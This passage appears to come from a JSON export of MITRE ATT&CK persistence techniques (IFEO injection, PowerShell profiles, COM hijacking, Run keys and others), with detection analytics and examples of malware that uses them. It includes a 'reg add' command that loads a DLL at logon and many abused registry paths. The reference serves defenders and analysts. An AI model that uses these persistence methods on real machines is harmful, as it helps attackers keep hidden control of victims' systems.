      "FIN7has used application shim databases for persistence.[3]",
      "Pillowminthas used a malicious shim database to maintain persistence.[4]",
      "SDBbothas the ability to use application shimming for persistence if it detects it is running as admin on Windows XP or 7, by creating a shim database to patch services.exe.[5]",
      "ShimRathas installed shim databases in theAppPatchfolder.[6]"
    ]
  },
  "T1546.012": {
    "Name": "Event Triggered Execution:Image File Execution Options Injection",
    "Description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g.,C:\\dbg\\ntsd.exe -g  notepad.exe).[1]IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.[2]IFEOs are represented asDebuggervalues in the Registry underHKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\where<executable>is the binary on which the debugger is attached.[1]IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).[3][4]Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values inHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\.[3][4]Similar toAccessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected withRemote Desktop Protocolwill cause the \"debugger\" program to be executed with SYSTEM privileges.[5]Similar toProcess Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.[6]Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO toImpair Defensesby registering invalid debuggers that redirect and effectively disable various system and security applications.[7][8]",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers.",
      "Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such asDEBUG_PROCESSandDEBUG_ONLY_THIS_PROCESS.[1]",
      "Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc."
    ],
    "Procedure Examples": [
      "During theC0032campaign,TEMP.Velesmodified and added entries withinHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Optionsto maintain persistence.[9]",
      "SDBbothas the ability to use image file execution options for persistence if it detects it is running with admin privileges on a Windows version newer than Windows 7.[10]",
      "SUNBURSTcreated an Image File Execution Options (IFEO) Debugger registry value for the processdllhost.exeto trigger the installation ofCobalt Strike.[11]"
    ]
  },
  "T1546.013": {
    "Name": "Event Triggered Execution:PowerShell Profile",
    "Description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs whenPowerShellstarts and can be used as a logon script to customize user environments.PowerShellsupports several profiles depending on the user or host program. For example, there can be different profiles forPowerShellhost programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.[1]Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/orPowerShelldrives to gain persistence. Every time a user opens aPowerShellsession the modified script will be executed unless the-NoProfileflag is used when it is launched.[2]An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.[3]",
    "Detects": [
      "Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules.",
      "Locations whereprofile.ps1can be stored should be monitored for new profiles.[4]Example profile locations include:*$PsHome\\Profile.ps1*$PsHome\\Microsoft.{HostProgram}_profile.ps1*$Home\\My Documents\\PowerShell\\Profile.ps1*$Home\\My Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1",
      "Locations whereprofile.ps1can be stored should be monitored for modifications.[4]Example profile locations include:*$PsHome\\Profile.ps1*$PsHome\\Microsoft.{HostProgram}_profile.ps1*$Home\\My Documents\\PowerShell\\Profile.ps1*$Home\\My Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1",
      "Monitor newly executed processes that may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles."
    ],
    "Procedure Examples": [
      "Turlahas used PowerShell profiles to maintain persistence on an infected machine.[2]"
    ]
  },
  "T1546.014": {
    "Name": "Event Triggered Execution:Emond",
    "Description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is aLaunch Daemonthat accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at/sbin/emondwill load any rules from the/etc/emond.d/rules/directory and take action once an explicitly defined event takes place.The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path/private/var/db/emondClients, specified in theLaunch Daemonconfiguration file at/System/Library/LaunchDaemons/com.apple.emond.plist.[1][2][3]Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.[1][2][3]Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by theLaunch Daemonservice.",
    "Detects": [
      "Monitor executed commands and arguments that may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond).",
      "Monitor emond rules creation by checking for files created in/etc/emond.d/rules/and/private/var/db/emondClients.",
      "Monitor emond rules creation by checking for files modified in/etc/emond.d/rules/and/private/var/db/emondClients.",
      "Monitor newly executed processes that may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond)."
    ],
    "Procedure Examples": [
      "Consider disabling emond by removing theLaunch Daemonplist file."
    ]
  },
  "T1546.015": {
    "Name": "Event Triggered Execution:Component Object Model Hijacking",
    "Description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1]References to various COM objects are stored in the Registry.Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[2]An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
    "Detects": [
      "Monitor executed commands and arguments that may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.Note: Event ID 4104 (from the Microsoft-Windows-Powershell/Operational log) captures Powershell script blocks, which can be analyzed and used to detect on changes to COM registry keys, including HKCU\\Software\\Classes\\CLSID*.",
      "Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.",
      "Monitor newly executed processes that may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.",
      "There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex:Reg) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID.[16]Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.Analytic 1 - Component Object Model Hijackingsource=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode IN (12, 13, 14) TargetObject= \"\\Software\\Classes\\CLSID*\""
    ],
    "Procedure Examples": [
      "Some variants ofADVSTORESHELLachieve persistence by registering the payload as a Shell Icon Overlay handler COM object.[3]",
      "APT28has used COM hijacking for persistence by replacing the legitimateMMDeviceEnumeratorobject with a payload.[4][5]",
      "BBSRAThas been seen persisting via COM hijacking through replacement of the COM object for MruPidlList{42aedc87-2188-41fd-b9a3-0c966feabec1}or Microsoft WBEM New Event Subsystem{F3130CDB-AA52-4C3A-AB32-85FFC23AF9C1}depending on the system's CPU architecture.[6]",
      "ComRATsamples have been seen which hijack COM objects for persistence by replacing the path to shell32.dll in registry locationHKCU\\Software\\Classes\\CLSID{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32.[7]",
      "Ferociouscan use COM hijacking to establish persistence.[8]",
      "JHUHUGIThas used COM hijacking to establish persistence by hijacking a class named MMDeviceEnumerator and also by registering the payload as a Shell Icon Overlay handler COM object ({3543619C-D563-43f7-95EA-4DA7E1CC396A}).[4][9]",
      "KONNIhas modified ComSysApp service to load the malicious DLL payload.[10]",
      "Mosquitouses COM hijacking as a method of persistence.[11]",
      "PcSharehas created theHKCU\\\\Software\\\\Classes\\\\CLSID\\\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\\\InprocServer32Registry key for persistence.[12]",
      "SILENTTRINITYcan add a CLSID key for payload execution throughRegistry.CurrentUser.CreateSubKey(\"Software\\\\Classes\\\\CLSID\\\\{\" + clsid + \"}\\\\InProcServer32\").[13]",
      "SVCReadyhas created theHKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{E6D34FFC-AD32-4d6a-934C-D387FA873A19}Registry key for persistence.[14]",
      "WarzoneRATcan perform COM hijacking by setting the path to itself to theHKCU\\Software\\Classes\\Folder\\shell\\open\\commandkey with aDelegateExecuteparameter.[15]"
    ]
  },
  "T1546.016": {
    "Name": "Event Triggered Execution:Installer Packages",
    "Description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.[1]Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOSpostinstallscripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as aLaunch Daemon) with the elevated permissions.[2][3][4][5]Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can includepreinst,postinst,prerm,postrmscripts and run as root when executed.For Windows, the Microsoft Installer services uses.msifiles to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.[6]",
    "Detects": [
      "Monitor executed commands and arguments that may be related to abuse of installer packages, including malicious commands triggered by application installations.",
      "Monitor creation of files associated with installer packages that may be abused for malicious execution.",
      "Monitor processes with arguments that may be related to abuse of installer packages, including malicious, likely elevated processes triggered by application installations."
    ],
    "Procedure Examples": [
      "DuringAppleJeus's installation process, it usespostinstallscripts to extract a hidden plist from the application's/Resourcesfolder and execute theplistfile as aLaunch Daemonwith elevated permissions.[7]"
    ]
  },
  "T1546.017": {
    "Name": "Event Triggered Execution:Udev Rules",
    "Description": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the/devdirectory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files withmatch keysto specify the conditions a hardware event must meet andaction keysto define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in/etc/udev/rules.d/,/run/udev/rules.d/,/usr/lib/udev/rules.d/,/usr/local/lib/udev/rules.d/, and/lib/udev/rules.d/. Rule priority is determined by both directory and by the digit prefix in the rule filename.[1][2]Adversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as/dev/random, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action keyRUN+=to detach and run the malicious content’s process in the background to bypass these controls.[3]",
    "Detects": [
      "Monitor the creation and modification of files in the directories where udev rules are located:/etc/udev/rules.d/,/run/udev/rules.d/,/lib/udev/rules.d/,/usr/lib/udev/rules.d/, and/usr/local/lib/udev/rules.d/. Analyze and monitor changes toRUNassignment key.[1][2]",
      "Monitor the creation of new processes that are children ofsystemd-udevd.serviceat the process tree level.[1]"
    ],
    "Procedure Examples": []
  },
  "T1547": {
    "Name": "Boot or Logon Autostart Execution",
    "Description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.[1][2][3][4][5]These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
    "Detects": [
      "Monitor executed commands and arguments that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.",
      "Monitor for unusual kernel driver installation activity that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.",
      "Monitor for newly constructed files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.",
      "Monitor for changes made to files that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.",
      "Monitor for unusual kernel driver installation activity that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.",
      "Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.",
      "Monitor for API calls that may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems.",
      "Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data to increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.",
      "Monitor for additions of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry.",
      "Monitor for modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry."
    ],
    "Procedure Examples": [
      "APT42has modified the Registry to maintain persistence.[6]",
      "BoxCaonestablished persistence by setting theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\loadregistry key to point to its executable.[7]",
      "Dtrack’s RAT makes a persistent target file with auto execution on the host start.[8]",
      "Mis-Typehas created registry keys for persistence, includingHKCU\\Software\\bkfouerioyou,HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}, andHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}.[9]",
      "Misdathas created registry keys for persistence, includingHKCU\\Software\\dnimtsoleht\\StubPath,HKCU\\Software\\snimtsOleht\\StubPath,HKCU\\Software\\Backtsaleht\\StubPath,HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}, andHKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}.[9]",
      "xCaonhas added persistence via the Registry keyHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\loadwhich causes the malware to run each time any user logs in.[7]"
    ]
  },
  "T1547.001": {
    "Name": "Boot or Logon Autostart Execution:Registry Run Keys / Startup Folder",
    "Description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.[1]These programs will be executed under the context of the user and will have the account's associated permissions level.The following run keys are created by default on Windows systems:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceRun keys may exist under multiple hives.[2][3]TheHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceExis also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.[1]For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx:reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"[4]Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user isC:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users isC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.The following Registry keys can be used to set startup folder items for persistence:HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell FoldersHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunPrograms listed in the load value of the registry keyHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windowsrun automatically for the currently logged-on user.By default, the multistringBootExecutevalue of the registry keyHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manageris set toautocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also useMasqueradingto make the Registry entries look as if they are associated with legitimate programs.",
    "Detects": [
      "Monitor executed commands and arguments that may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.",
      "Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including the startup folders.[313]",
      "Monitor for newly executed processes executed from the Run/RunOnce registry keys through Windows EID 9707 or \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" and \"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" registry keys with the full command line.Registry modifications are often essential in establishing persistence via known Windows mechanisms. Many legitimate modifications are done graphically via regedit.exe or by using the corresponding channels, or even calling the Registry APIs directly. The built-in utility reg.exe provides a command-line interface to the registry, so that queries and modifications can be performed from a shell, such as cmd.exe. When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe. Occasionally, power users and administrators write scripts that do this behavior as well, but likely from a different process tree. These background scripts must be learned so they can be tuned out accordingly.Output DescriptionThe sequence of processes that resulted in reg.exe being started from a shell. That is, a hierarchy that looks like• great-grand_parent.exe• grand_parent.exe• parent.exe• reg.exeAnalytic 1 - Reg.exe called from Command Shell(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") Image=\"reg.exe\" AND ParentImage=\"cmd.exe\"| join left=L right=R where L.ParentProcessGuid = R.ProcessGuid     [search EventCode IN (1, 4688) Image=\"cmd.exe\" ParentImage!=\"explorer.exe\"]",
      "Monitor for newly created windows registry keys that may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.",
      "Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations.[313]Detection of the modification of the registry keyCommon Startuplocated in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\ and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders. When a user logs on, any files located in the Startup Folder are launched. Attackers may modify these folders with other files in order to evade detection set on these default folders. This detection focuses on EventIDs 4688 and 1 for process creation and EventID 4657 for the modification of the Registry Keys.Analytic 1 - Modification of Default Startup Folder in the Registry Key ‘Common Startup’(source=\"WinEventLog:Security\" EventCode=\"4657\" ObjectValueName=\"Common Startup\") OR (source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"13\" TargetObject=\"*Common Startup\")"
    ],
    "Procedure Examples": [
      "ADVSTORESHELLachieves persistence by adding itself to theHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunRegistry key.[5][6][7]",
      "Agent Teslacan add itself to the Registry as a startup program to establish persistence.[8][9]",
      "Amadeyhas changed the Startup folder to the one containing its executable by overwriting the registry keys.[10][11]",
      "ANDROMEDAcan establish persistence by dropping a sample of itself toC:\\ProgramData\\Local Settings\\Temp\\mskmde.comand adding a Registry run key to execute every time a user logs on.[12]",
      "AppleSeedhas the ability to create the Registry key nameEstsoftAutoUpdateatHKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnceto establish persistence.[13]",
      "APT18establishes persistence via theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runkey.[14][15]",
      "AnAPT19HTTP malware variant establishes persistence by setting the Registry keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\.[16]",
      "APT28has deployed malware that has copied itself to the startup directory for persistence.[17]",
      "APT29added Registry Run keys to establish persistence.[18]",
      "APT3places scripts in the startup folder for persistence.[19]",
      "APT32established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.[20][21][22]",
      "APT33has deployed a tool known asDarkCometto the Startup folder of a victim, and used Registry run keys to gain persistence.[23][24]",
      "APT37's has added persistence via the Registry keyHKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.[25][26]",
      "APT39has maintained persistence using the startup folder.[27]",
      "APT41created and modified startup files for persistence.[28][29]APT41added a registry key inHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchostto establish persistence forCobalt Strike.[30]",
      "Aria-bodyhas established persistence via the Startup folder or Run Registry key.[31]",
      "Astarothcreates a startup item for persistence.[32]",
      "AuTo Stealercan place malicious executables in a victim's AutoRun registry key or StartUp directory, depending on the AV product installed, to maintain persistence.[33]",
      "Avaddonuses registry run keys for persistence.[34]",
      "AvosLockerhas been executed via theRunOnceRegistry key to run itself on safe mode.[35]",
      "BabySharkhas added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.[36][37]",
      "Backdoor.Oldreaadds Registry Run keys to achieve persistence.[38][39]",
      "BACKSPACEachieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[40]",
      "BADNEWSinstalls a registry Run key to establish persistence.[41]",
      "BadPatchestablishes a foothold by adding a link to the malware executable in the startup folder.[42]",
      "Bazarcan create or add files to Registry Run Keys to establish persistence.[43][44]",
      "BBSRAThas been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key locationHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe.",
      "Bisonalhas added itself to the Registry keyHKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\for persistence.[45][46]",
      "BitPaymerhas set the run keyHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[47]",
      "BlackBytehas used Registry Run keys for persistence.[48]",
      "TheBlackEnergy3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[49]",
      "BoomBoxcan establish persistence by writing the Registry valueMicroNativeCacheSvctoHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[50]",
      "Bribacreates run key Registry entries pointing to malicious DLLs dropped to disk.[51]",
      "BRONZE BUTLERhas used a batch script that adds a Registry Run key to establish malware persistence.[52]",
      "build_downerhas the ability to add itself to the Registry Run key for persistence.[53]",
      "Carbanakstores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.[54]",
      "Carberphas maintained persistence by placing itself inside the current user's startup folder.[55]",
      "Cardinal RATestablishes Persistence by setting theHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadRegistry key to point to its executable.[56]",
      "Chaeshas added persistence via the Registry keysoftware\\microsoft\\windows\\currentversion\\run\\microsoft windows html help.[57]",
      "ChChesestablishes persistence by adding a Registry Run key.[58]",
      "Chinoxyhas established persistence via theHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Runregistry key and by loading a dropper to(%COMMON_ STARTUP%\\\\eoffice.exe).[59]",
      "Clamblingcan establish persistence by adding a Registry run key.[60][61]",
      "Cobalt Grouphas used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.[62]",
      "Cobian RATcreates an autostart Registry key to ensure persistence.[63]",
      "Comnieachieves persistence by adding a shortcut of itself to the startup path in the Registry.[64]",
      "Confickeradds Registry Run keys to establish persistence.[65]",
      "Confuciushas dropped malicious files into the startup folder%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startupon a compromised host in order to maintain persistence.[66]",
      "CORESHELLhas established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.[67]",
      "One persistence mechanism used byCozyCaris to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys:HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\RunHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run[68]",
      "Crimsoncan add Registry run keys for persistence.[69][70]",
      "CrossRATuses run keys for persistence on Windows.[71]",
      "Dark Caracal's version ofBandookadds a registry key toHKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[71]",
      "DarkCometadds several Registry entries to enable automatic execution at every system startup.[72][73]",
      "DarkGateinstallation includes AutoIt script execution creating a shortcut to itself as an LNK object, such as bill.lnk, in the victim startup folder.[74][75]DarkGateinstallation finishes with the creation of a registry Run key.[74]",
      "Darkhotelhas been known to establish persistence by adding programs to the Run Registry key.[76]",
      "DarkTortillahas established persistence via theSoftware\\Microsoft\\Windows NT\\CurrentVersion\\Runregistry key and by creating a .lnk shortcut file in the Windows startup folder.[77]",
      "DnsSystemcan write itself to the Startup folder to gain persistence.[78]",
      "DownPaperuses PowerShell to add a Registry Run key in order to establish persistence.[79]",
      "Dragonflyhas added the registry value ntdll to the Registry Run key to establish persistence.[80]",
      "DustySkyachieves persistence by creating a Registry entry inHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[81]",
      "If establishing persistence by installation as a new service fails, one variant ofEliseestablishes persistence for the created .exe file by setting the following Registry key:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry keys for persistence:HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self]andHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD.[82][83]",
      "Variants ofEmissaryhave added Run Registry keys to establish persistence.[84]",
      "Emotethas been observed adding the downloaded payload to theHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Runkey to maintain persistence.[85][86][87]",
      "Empirecan modify the registry run keysHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunandHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runfor persistence.[88]",
      "EvilBunnyhas created Registry keys for persistence in[HKLM|HKCU]\\…\\CurrentVersion\\Run.[89]",
      "EvilGrabadds a Registry Run key for ctfmon.exe to establish persistence.[58]",
      "EVILNUMcan achieve persistence through the Registry Run key.[90][91]",
      "FatDukehas usedHKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Runto establish persistence.[92]",
      "FELIXROOTadds a shortcut file to the startup folder for persistence.[93]",
      "FIN10has established persistence by using the Registry option in PowerShell Empire to add a Run key.[94][88]",
      "FIN13has used Windows Registry run keys such as,HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hoststo maintain persistence.[95]",
      "FIN6has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.[96]",
      "FIN7malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.[97][98]",
      "Final1stspycreates a Registry Run key to establish persistence.[99]",
      "FinFisherestablishes persistence by creating the Registry keyHKCU\\Software\\Microsoft\\Windows\\Run.[100][101]",
